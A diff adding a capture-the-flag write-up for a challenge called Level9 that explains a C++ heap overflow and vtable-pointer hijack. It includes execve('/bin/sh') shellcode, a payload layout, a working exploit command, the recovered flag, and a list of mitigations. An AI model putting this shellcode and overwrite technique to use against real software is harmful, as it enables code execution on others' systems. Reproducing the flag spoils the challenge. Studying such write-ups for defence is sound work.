@@ -1,0 +1,146 @@
+C++ Virtual Table Hijacking Analysis - Level9
+==============================================
+
+Vulnerability Type: Heap Buffer Overflow + Vtable Hijacking
+Technique: C++ Virtual Function Table Pointer Overwrite
+
+Object Layout:
+--------------
+C++ objects with virtual functions have this memory layout:
+
+[vtable pointer][member variables...]
+ ↑ 4 bytes      ↑ rest of object
+
+For class N:
+Offset 0x00: vtable pointer (4 bytes)
+Offset 0x04: annotation buffer (100 bytes)
+Offset 0x68: value (4 bytes)
+Total size: 108 bytes (0x6c)
+
+Heap Layout:
+------------
+First object:  0x804a008 [vtable][annotation - 100 bytes][value]
+Second object: 0x804a078 [vtable][annotation - 100 bytes][value]
+Distance: 0x70 (112 bytes)
+
+The Vulnerability:
+------------------
+void N::setAnnotation(char *input) {
+    memcpy(this->annotation, input, strlen(input));  // No bounds checking!
+}
+
+This allows us to overflow the first object's annotation buffer and
+overwrite the second object's vtable pointer.
+
+Virtual Function Call Mechanism:
+---------------------------------
+Normal C++ virtual function call:
+    second->operator+(first)
+
+Assembly level:
+1. Read vtable pointer from second object (offset 0)
+2. Read function pointer from vtable (first entry)
+3. Call that function with (second, first) as arguments
+
+Decompiled representation:
+    (**second)(second, first)
+
+Exploitation Strategy:
+----------------------
+1. Craft payload with:
+   - Fake vtable entry pointing to shellcode
+   - Shellcode to execute /bin/sh
+   - Padding to reach second object's vtable
+   - Address to overwrite second's vtable pointer
+
+2. When virtual function is called on second object:
+   - Reads our fake vtable pointer
+   - Jumps to our shellcode
+   - Executes /bin/sh
+
+Payload Structure:
+------------------
+Offset | Size | Content              | Purpose
+-------|------|----------------------|----------------------------------
+0-3    | 4    | \x0c\xa0\x04\x08    | Fake vtable entry (→ shellcode)
+4-31   | 28   | Shellcode            | execve("/bin/sh") code
+32-107 | 76   | 'A' * 76            | Padding to reach offset 108
+108-111| 4    | \x0c\xa0\x04\x08    | Overwrites second's vtable pointer
+
+Memory After Overflow:
+----------------------
+0x804a008: [vtable] [fake_vtable_entry][shellcode][AAAA...]
+           ↑        ↑                   ↑
+           first    0x804a00c           0x804a010
+
+0x804a078: [0x804a00c] [annotation][value]
+           ↑
+           second (vtable now points to our fake vtable!)
+
+Fake Vtable:
+0x804a00c: [0x804a010]  ← Points to shellcode
+           ↑
+           Our fake vtable (in first object's data)
+
+Shellcode (28 bytes):
+---------------------
+\x31\xc0              xor eax, eax          ; Zero eax
+\x50                  push eax              ; NULL terminator
+\x68\x2f\x2f\x73\x68  push 0x68732f2f       ; "//sh"
+\x68\x2f\x62\x69\x6e  push 0x6e69622f       ; "/bin"
+\x89\xe3              mov ebx, esp          ; ebx = "/bin//sh"
+\x89\xc1              mov ecx, eax          ; ecx = NULL
+\x89\xc2              mov edx, eax          ; edx = NULL
+\xb0\x0b              mov al, 0x0b          ; syscall 11 (execve)
+\xcd\x80              int 0x80              ; Execute
+\x31\xc0              xor eax, eax          ; Zero eax
+\x40                  inc eax               ; eax = 1
+\xcd\x80              int 0x80              ; exit(0)
+
+Execution Flow:
+---------------
+1. main() creates two N objects
+2. first->setAnnotation(argv[1]) copies our payload
+3. Overflow overwrites second->vtable to 0x804a00c
+4. return (*second) + (*first) triggers virtual call
+5. CPU reads vtable from second: 0x804a00c
+6. CPU reads function pointer from 0x804a00c: 0x804a010
+7. CPU jumps to 0x804a010 (our shellcode!)
+8. Shellcode executes /bin/sh
+9. Shell runs as bonus0 user
+
+Why This Works:
+---------------
+- NX Disabled: Heap is executable, shellcode runs
+- No ASLR: Addresses are predictable (0x804a008, 0x804a078)
+- No Canary: Not relevant for heap exploitation
+- Predictable Layout: new operator allocates sequentially
+
+Exploit Command:
+----------------
+./level9 `python -c 'print("\x0c\xa0\x04\x08" + 
+    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e" +
+    "\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + 
+    "A"*76 + "\x0c\xa0\x04\x08")'`
+
+Result:
+-------
+Shell spawned as bonus0
+Flag: f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
+
+Key Concepts:
+-------------
+- C++ objects store vtable pointer as first member
+- Virtual function calls use double indirection
+- Heap buffer overflow can corrupt adjacent objects
+- Vtable hijacking redirects execution to shellcode
+- Understanding C++ internals is crucial for exploitation
+
+Security Lessons:
+-----------------
+- Always bounds-check memcpy/strcpy operations
+- Use safe C++ string classes (std::string)
+- Enable NX/DEP to prevent heap code execution
+- Enable ASLR to randomize heap addresses
+- Use vtable verification mechanisms (CFI)
+
